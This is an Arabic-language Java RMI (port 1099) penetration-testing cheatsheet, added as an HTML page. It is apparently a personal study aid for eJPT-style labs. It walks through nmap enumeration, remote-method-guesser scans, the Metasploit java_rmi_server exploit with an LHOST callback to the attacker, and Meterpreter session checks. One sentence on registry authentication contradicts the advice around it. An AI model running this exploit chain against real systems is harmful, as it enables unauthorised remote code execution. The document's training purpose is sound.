@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Java RMI Cheatsheet — 1099</title>
+<style>
+:root{
+  --bg:#0b0b0b;
+  --panel:#141414;
+  --panel-2:#1a1a1a;
+  --border:#2b2b2b;
+  --gold:#d4af37;
+  --gold-dim:#8a712a;
+  --yellow:#e8c547;
+  --text:#e9e6da;
+  --text-dim:#a19c8c;
+  --mono:#f2e6b8;
+  --green:#7fae4a;
+  --red:#b5544a;
+}
+*{box-sizing:border-box;}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:"Tahoma","Segoe UI",sans-serif;
+  margin:0;
+  padding:0 0 4rem;
+  line-height:1.7;
+}
+.wrap{max-width:900px;margin:0 auto;padding:2rem 1.5rem;}
+
+.hero{border-bottom:1px solid var(--border);padding-bottom:1.5rem;margin-bottom:2rem;}
+.hero .tag{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:13px;color:var(--bg);background:var(--gold);padding:2px 10px;border-radius:3px;margin-bottom:10px;letter-spacing:.5px;}
+.hero h1{font-size:30px;margin:0 0 6px;color:var(--yellow);}
+.hero p{color:var(--text-dim);margin:0;font-size:14px;}
+.signature{display:inline-flex;align-items:center;gap:6px;margin-top:14px;font-family:"Consolas",monospace;font-size:11.5px;color:var(--gold-dim);border:1px solid var(--border);padding:4px 10px;border-radius:20px;}
+.signature b{color:var(--gold);font-weight:normal;}
+
+.stage{margin-bottom:2.2rem;background:var(--panel);border:1px solid var(--border);border-right:3px solid var(--gold);border-radius:6px;padding:1.2rem 1.4rem;}
+.stage h2{color:var(--gold);font-size:19px;margin:0 0 4px;display:flex;align-items:center;gap:8px;}
+.stage .desc{color:var(--text-dim);font-size:13.5px;margin:0 0 14px;}
+
+h3.sub{color:var(--yellow);font-size:15px;margin:18px 0 8px;border-bottom:1px dashed var(--border);padding-bottom:5px;}
+h3.sub:first-of-type{margin-top:0;}
+
+.step{margin-bottom:14px;padding-bottom:14px;border-bottom:1px dashed var(--border);}
+.step:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0;}
+.step-title{font-size:14.5px;color:var(--text);margin-bottom:6px;font-weight:bold;}
+.where{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:11px;background:var(--panel-2);color:var(--yellow);border:1px solid var(--gold-dim);padding:1px 8px;border-radius:10px;margin-inline-start:8px;vertical-align:middle;}
+.cmd{background:#0e0e0e;border:1px solid var(--border);border-radius:5px;padding:10px 14px;font-family:"Consolas","Courier New",monospace;font-size:13.5px;color:var(--mono);direction:ltr;text-align:left;overflow-x:auto;margin:6px 0;white-space:pre;}
+.cmd .cm{color:#6b6b6b;}
+.note{font-size:12.5px;color:var(--text-dim);margin-top:4px;}
+.note b{color:var(--yellow);font-weight:normal;}
+.tip{background:rgba(212,175,55,.08);border-inline-start:2px solid var(--gold);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.danger{background:rgba(181,84,74,.08);border-inline-start:2px solid var(--red);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.result{font-size:12.5px;color:var(--green);margin-top:6px;font-family:"Consolas","Courier New",monospace;direction:ltr;text-align:left;}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+@media (max-width:640px){.grid2{grid-template-columns:1fr;}}
+
+.toc{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:1rem 1.3rem;margin-bottom:2rem;font-size:13.5px;}
+.toc .ttl{color:var(--yellow);font-weight:bold;margin-bottom:8px;display:block;}
+.toc ol{margin:0;padding-inline-start:20px;color:var(--text-dim);}
+.toc li{margin-bottom:4px;}
+.toc a{color:var(--text-dim);text-decoration:none;}
+.toc a:hover{color:var(--yellow);}
+
+.portnote{background:var(--panel-2);border:1px solid var(--gold-dim);border-radius:6px;padding:.8rem 1.1rem;margin-bottom:2rem;font-size:13px;color:var(--text-dim);}
+.portnote b{color:var(--yellow);}
+
+.badge{display:inline-block;font-size:10px;padding:1px 7px;border-radius:8px;margin-inline-start:6px;font-family:"Consolas",monospace;vertical-align:middle;}
+.badge.win{background:#1c2733;color:#8fb3ff;border:1px solid #2e4560;}
+.badge.lin{background:#1a2417;color:#9fd97b;border:1px solid #33502a;}
+
+footer{text-align:center;color:var(--text-dim);font-size:11.5px;margin-top:3rem;padding-top:1.2rem;border-top:1px solid var(--border);}
+footer .author{color:var(--gold);font-size:13px;margin-bottom:6px;}
+footer .disclaimer{max-width:560px;margin:0 auto;color:#7a7666;font-size:11px;line-height:1.6;}
+
+</style>
+</head>
+<body>
+<div class="wrap">
+<div class="hero">
+<span class="tag">PORT 1099 / TCP — JAVA RMI</span>
+<h1>Java RMI — من الفحص إلى ما بعد الاستغلال</h1>
+<p>Quick Service Reference — مرجع عملي أثناء الـLab لخدمة Java Remote Method Invocation وRMI Registry.</p>
+<div class="signature">✒ <b>Abdullah Nasser Almsan</b> — Personal Pentest Reference</div>
+</div>
+<div class="portnote">
+<b>ملاحظة عن البورت:</b> البورت الشائع للـJava RMI Registry هو 1099/TCP، لكن التطبيق يقدر يغيّره، والـRegistry قد يعيد لك Remote Object يعمل على بورت مختلف.
+  إذا ما ظهر 1099، لا تستبعد RMI قبل فحص <code style="direction:ltr;display:inline-block">-p-</code>.
+</div>
+<div class="toc">
+<span class="ttl">المراحل</span>
+<ol>
+<li><a href="#s1">1. Reconnaissance</a></li>
+<li><a href="#s2">2. Port Scanning</a></li>
+<li><a href="#s3">3. Enumeration</a></li>
+<li><a href="#s4">4. Credential Testing</a></li>
+<li><a href="#s5">5. Exploitation</a></li>
+<li><a href="#s6">6. Post-Exploitation</a></li>
+</ol>
+</div>
+<div class="stage" id="s1">
+<h2>1. Reconnaissance</h2>
+<p class="desc">ابدأ بتأكيد شبكتك والوصول للهدف قبل ما تدخل في فحص Java RMI.</p>
+<h3 class="sub">تحديد شبكتك ومسار الهدف</h3>
+<div class="step">
+<div class="step-title">Identify Local Interface <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">ip a</div>
+<div class="note">اعرف عنوان جهازك والواجهة المستخدمة.</div>
+</div>
+<div class="step">
+<div class="step-title">Review Network Route <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">ip route</div>
+<div class="note">تأكد من الشبكة والـgateway والمسار للهدف.</div>
+</div>
+<h3 class="sub">اختبار الوصول</h3>
+<div class="step">
+<div class="step-title">Test Target Reachability <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">ping -c 4 [TARGET]</div>
+<div class="note">إذا ما رد الهدف، لا تعتبره Down مباشرة؛ قد يكون ICMP محجوب.</div>
+</div>
+<div class="step">
+<div class="step-title">Discover Live Hosts <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -sn [SUBNET]</div>
+<div class="note">استخدمه لاكتشاف الأجهزة الحية داخل Lab مصرح.</div>
+</div>
+<div class="tip">Java RMI غالبًا يظهر داخل بيئات Java داخلية. إذا شفت أكثر من جهاز Java على نفس الشبكة، سجّل كل IP وخله ضمن مسار الفحص.</div>
+</div>
+<div class="stage" id="s2">
+<h2>2. Port Scanning</h2>
+<p class="desc">البورت الشائع للـRMI Registry هو 1099/TCP، لكن ممكن يتغير لذلك لا تعتمد على 1099 فقط.</p>
+<h3 class="sub">فحص البورت الافتراضي</h3>
+<div class="step">
+<div class="step-title">Detect Java RMI Service <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -p1099 -sV [TARGET]</div>
+<div class="note">ابدأ بتحديد هل الخدمة مفتوحة وما إذا تعرف Nmap عليها كـJava RMI.</div>
+<div class="result">GENERAL REFERENCE — النجاح = Nmap يعرّف Java RMI أو يؤكد أن البورت يتحدث الخدمة المتوقعة.</div></div>
+<div class="step">
+<div class="step-title">Fingerprint Java RMI Service <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -p1099 -sC -sV [TARGET]</div>
+<div class="note">يجمع version detection مع السكربتات الافتراضية.</div>
+</div>
+<h3 class="sub">الفحص الشامل عند عدم ظهور الخدمة</h3>
+<div class="step">
+<div class="step-title">Find Non-Standard RMI Port <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -p- --min-rate 1000 [TARGET]</div>
+<div class="note">مهم لأن RMI قد يكون على بورت غير 1099. داخل Lab فقط وراقب تأثير السرعة.</div>
+</div>
+<div class="step">
+<div class="step-title">Confirm Discovered RMI Port <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -p[PORT] -sV -sC [TARGET]</div>
+<div class="note">أعد الفحص على البورت المكتشف فعليًا.</div>
+</div>
+<h3 class="sub">تأكيد الاتصال يدويًا</h3>
+<div class="step">
+<div class="step-title">Confirm TCP Connectivity <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nc -nv [TARGET] [PORT]</div>
+<div class="note">يفيد فقط لتأكيد أن TCP يقبل الاتصال؛ RMI بروتوكول ثنائي لذلك لا تتوقع banner نصي واضح.</div>
+</div>
+<div class="danger">لا تستنتج أن الخدمة ليست RMI فقط لأن Netcat ما أعطاك banner. اعتمد على Nmap/NSE وأدوات RMI المتخصصة.</div>
+</div>
+<div class="stage" id="s3">
+<h2>3. Enumeration</h2>
+<p class="desc">الهدف هنا معرفة محتويات الـRegistry، أسماء الـremote objects، endpoints، وأي codebase أو إعدادات تكشف مسار استغلال.</p>
+<h3 class="sub">Nmap NSE — Dump Registry</h3>
+<div class="step">
+<div class="step-title">Enumerate RMI Registry <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -p[PORT] --script rmi-dumpregistry [TARGET]</div>
+<div class="note">يعرض الـRMI Registry bindings والتفاصيل التي يستطيع Nmap استخراجها.</div>
+<div class="result">GENERAL REFERENCE — النجاح = ظهور Registry bindings/remote objects التي يكشفها الـRegistry.</div></div>
+<div class="step">
+<div class="step-title">Enumerate Registry with Version Detection <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -p[PORT] --script rmi-dumpregistry -sV [TARGET]</div>
+<div class="note">أعده مع version detection حتى تجمع أكبر قدر ممكن من السياق.</div>
+</div>
+<h3 class="sub">فحص Classloader exposure</h3>
+<div class="step">
+<div class="step-title">Check RMI Classloader Exposure <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -p[PORT] --script rmi-vuln-classloader [TARGET]</div>
+<div class="note">يفحص إعدادات RMI class loading الخطرة المعروفة.</div>
+<div class="result">GENERAL REFERENCE — اعتبر المسار مهمًا فقط إذا الفحص نفسه يبين exposure مناسبًا؛ لا تفترض القابلية للاستغلال من البورت وحده.</div></div>
+<div class="tip">لو ظهر Remote Object باسم غريب أو hostname/port إضافي داخل الـRegistry، دوّنه. RMI قد يحيلك إلى endpoint آخر غير بورت الـRegistry نفسه.</div>
+<h3 class="sub">Remote Method Guesser (RMG)</h3>
+<div class="step">
+<div class="step-title">Enumerate RMI with RMG <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">java -jar rmg.jar enum [TARGET] [PORT]</div>
+<div class="note">إذا كانت أداة RMG موجودة عندك، استخدم enum لاستخراج معلومات الـRegistry والـobjects.</div>
+<div class="result">GENERAL REFERENCE — النجاح = ظهور Registry objects أو معلومات خدمة قابلة للاستخدام في القرار التالي.</div></div>
+<div class="step">
+<div class="step-title">Scan RMI Service with RMG <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">java -jar rmg.jar scan [TARGET] [PORT]</div>
+<div class="note">يفيد في فحص الخدمة بشكل أوسع حسب إصدار RMG المتوفر عندك.</div>
+</div>
+<div class="note"><b>مهم:</b> خيارات RMG تختلف قليلًا بين الإصدارات. استخدم <code>java -jar rmg.jar --help</code> لو احتجت تطابق الصياغة مع نسختك.</div>
+<h3 class="sub">Metasploit — البحث عن Modules مناسبة</h3>
+<div class="step">
+<div class="step-title">Search RMI Modules <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">search rmi</div>
+<div class="note">اعرض Modules المتوفرة عندك بدل الاعتماد على أسماء محفوظة فقط.</div>
+</div>
+<div class="step">
+<div class="step-title">Search RMI Exploit Modules <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">search type:exploit rmi</div>
+<div class="note">فلتر النتائج إلى exploit modules.</div>
+</div>
+<div class="step">
+<div class="step-title">Review Java RMI Server Module <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">info exploit/multi/misc/java_rmi_server</div>
+<div class="note">راجع الشروط والخيارات قبل أي تشغيل.</div>
+</div>
+<div class="danger">مجرد وجود Java RMI لا يعني أنه قابل للاستغلال. لازم تربط نتيجة الـEnumeration بالإعداد أو الإصدار المناسب قبل تشغيل exploit.</div>
+</div>
+<div class="stage" id="s4">
+<h2>4. Credential Testing</h2>
+<p class="desc">RMI Registry نفسه عادةً ما يستخدم نموذج username/password تقليدي مثل SSH أو FTP. لذلك لا تسوي brute-force وهمي؛ اختبر credentials فقط إذا التطبيق البعيد كشف Authentication فعلي.</p>
+<h3 class="sub">تحديد هل يوجد Authentication على مستوى التطبيق</h3>
+<div class="step">
+<div class="step-title">Review Registry Bindings for Authentication <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">java -jar rmg.jar enum [TARGET] [PORT]</div>
+<div class="note">ابحث عن remote methods أو interfaces تشير إلى login/authenticate/session.</div>
+</div>
+<div class="step">
+<div class="step-title">Search RMI Scanner / Login Modules <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">search rmi</div>
+<div class="note">راجع هل توجد scanner/login modules مناسبة فعلًا لبيئتك وإصدارك.</div>
+</div>
+<div class="step">
+<div class="step-title">Review RMI Module Requirements <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">info [RMI_MODULE]</div>
+<div class="note">لا تستخدم أي login scanner إلا بعد ما تتأكد أن الـmodule يتوافق مع نوع الخدمة الموجود عندك.</div>
+</div>
+<h3 class="sub">Credential reuse عند وجود حسابات موثقة</h3>
+<div class="step">
+<div class="step-title">Review Lab Files for Reusable Credentials <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">grep -iE 'user|pass|login|credential' [FILE]</div>
+<div class="note">لو عندك output أو config من نفس الـLab، ابحث عن credentials لإعادة الاستخدام بدل brute-force عشوائي.</div>
+</div>
+<div class="tip">في RMI، Enumeration + misconfiguration غالبًا أهم بكثير من password spraying. لا تستخدم Hydra على 1099 بشكل عشوائي لأن RMI ليس خدمة login نصية قياسية.</div>
+<div class="danger">إذا كان الـRemote Object يطبق login خاص بالتطبيق، اختبر فقط credentials المصرح بها داخل الـLab وبحسب نفس protocol/method المكتشف.</div>
+</div>
+<div class="stage" id="s5">
+<h2>5. Exploitation</h2>
+<p class="desc">الاستغلال في RMI يعتمد على misconfiguration أو class loading / deserialization behavior. تأكد من الإصدار والإعداد قبل أي exploit.</p>
+<h3 class="sub">مسار 1 — التحقق من Insecure Class Loading</h3>
+<div class="step">
+<div class="step-title">Recheck RMI Classloader Exposure <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -p[PORT] --script rmi-vuln-classloader [TARGET]</div>
+<div class="note">استخدم نتيجة هذا الفحص لتقرر هل مسار classloader يستحق المتابعة.</div>
+</div>
+<div class="danger">تأكد من الإصدار والنتيجة قبل أي exploit. بعض محاولات RMI قد تسبب تعليق JVM أو crash للخدمة.</div>
+<h3 class="sub">مسار 2 — Metasploit Java RMI Server</h3>
+<div class="step">
+<div class="step-title">Select Java RMI Server Module <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use exploit/multi/misc/java_rmi_server</div>
+<div class="note">استخدمه فقط إذا Enumeration والـmodule info يطابقان الهدف.</div>
+</div>
+<div class="step">
+<div class="step-title">Review Module Options <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">show options</div>
+<div class="note">راجع RHOSTS/RPORT وأي SRVHOST/LHOST أو خيارات إضافية مطلوبة.</div>
+</div>
+<div class="step">
+<div class="step-title">Set Target Host <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">set RHOSTS [TARGET]</div>
+<div class="note">حدد الهدف داخل الـLab.</div>
+</div>
+<div class="step">
+<div class="step-title">Set Target Port <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">set RPORT [PORT]</div>
+<div class="note">استخدم البورت الفعلي المكتشف وليس 1099 إذا كانت الخدمة منقولة.</div>
+</div>
+<div class="step">
+<div class="step-title">Set Callback Host <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">set LHOST [ATTACKER_IP]</div>
+<div class="note">استخدم عنوانك الذي يستطيع الهدف الوصول له.</div>
+</div>
+<div class="step">
+<div class="step-title">Run Version-Specific Check <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">check</div>
+<div class="note">إذا كان الـmodule يدعم check، استخدمه قبل run.</div>
+<div class="result">GENERAL REFERENCE — إذا كان الـmodule يدعم check، فالنتيجة تساعد في تحديد ما إذا كانت شروط الـmodule تبدو متوافقة مع الهدف قبل التشغيل؛ نجاح check لا يعني نجاح exploitation ولا يعني فتح Session.</div></div>
+<div class="step">
+<div class="step-title">Execute Matched RMI Path <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">run</div>
+<div class="note">شغّل فقط بعد التأكد من الشروط والخيارات.</div>
+<div class="result">GENERAL REFERENCE — النجاح = Session/command execution فقط إذا ظهر ذلك فعليًا؛ اكتمال الـmodule وحده ليس إثباتًا.</div></div>
+<div class="tip">إذا فشل exploit رغم أن Registry مفتوح، ارجع لمرحلة Enumeration: قد يكون الـRegistry متاح لكن الـremote object غير قابل للاستغلال، أو الـendpoint الحقيقي على بورت آخر.</div>
+<h3 class="sub">مسار 3 — مراجعة RMG قبل أي هجوم متقدم</h3>
+<div class="step">
+<div class="step-title">Review RMG Attack Options <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">java -jar rmg.jar --help</div>
+<div class="note">راجع أوامر attack المتاحة في إصدارك بدل نسخ syntax من إصدار مختلف.</div>
+</div>
+<div class="note">لو اكتشفت gadget/deserialization path محدد، اربطه بالإصدار والـremote method الفعلي. لا تستخدم payload عشوائي بدون دليل من الـEnumeration.</div>
+</div>
+<div class="stage" id="s6">
+<h2>6. Post-Exploitation</h2>
+<p class="desc">بعد نجاح الاستغلال، المطلوب هنا تأكيد الوصول بسرعة وتوثيق السياق بدون تكرار دليل Post-Exploitation العام.</p>
+<h3 class="sub">تأكيد الجلسة</h3>
+<div class="step">
+<div class="step-title">Verify Meterpreter User <span class="where">METERPRETER</span></div>
+<div class="cmd">getuid</div>
+<div class="note">أكد المستخدم الذي تعمل به الجلسة.</div>
+</div>
+<div class="step">
+<div class="step-title">Identify Remote System <span class="where">METERPRETER</span></div>
+<div class="cmd">sysinfo</div>
+<div class="note">حدد نظام التشغيل والمعمارية والمضيف.</div>
+</div>
+<div class="step">
+<div class="step-title">Check Session Process <span class="where">METERPRETER</span></div>
+<div class="cmd">getpid</div>
+<div class="note">اعرف PID الحالي للجلسة.</div>
+</div>
+<div class="tip">بعد التأكيد، انتقل لملف Post-Exploitation العام عندك بدل تكرار enumeration النظام كامل هنا.</div>
+<h3 class="sub">لو حصلت على Shell مباشر بدل Meterpreter</h3>
+<div class="step">
+<div class="step-title">Immediate User Verification <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">whoami</div>
+<div class="note">تأكيد الهوية بسرعة.</div>
+</div>
+<div class="step">
+<div class="step-title">Immediate Host Verification <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">hostname</div>
+<div class="note">تأكيد أنك على الجهاز المقصود.</div>
+</div>
+<div class="step">
+<div class="step-title">Verify Linux Identity <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">id</div>
+<div class="note">على Linux يوضح UID/GID والمجموعات.</div>
+</div>
+<div class="danger">لا تنفذ تغييرات دائمة أو حذف logs أو تعطيل خدمات. داخل Lab اكتفِ بما يلزم لإثبات الوصول ثم وثق النتيجة.</div>
+</div>
+<footer>
+<div class="author">أُعدّ بواسطة Abdullah Nasser Almsan</div>
+<div class="disclaimer">
+    هذا الملف مرجع تقني شخصي مُعدّ لأغراض التعلّم واجتياز اختبارات الاختراق المرخّصة (زي EJPT) فقط.
+    يُستخدم حصرًا داخل بيئات Lab أو أنظمة مصرّح باختبارها رسميًا.
+    مُعدّه غير مسؤول عن أي استخدام خاطئ أو غير قانوني لهذا المحتوى خارج هذا النطاق.
+  </div>
+</footer>
+</div>
+</body>
+</html>
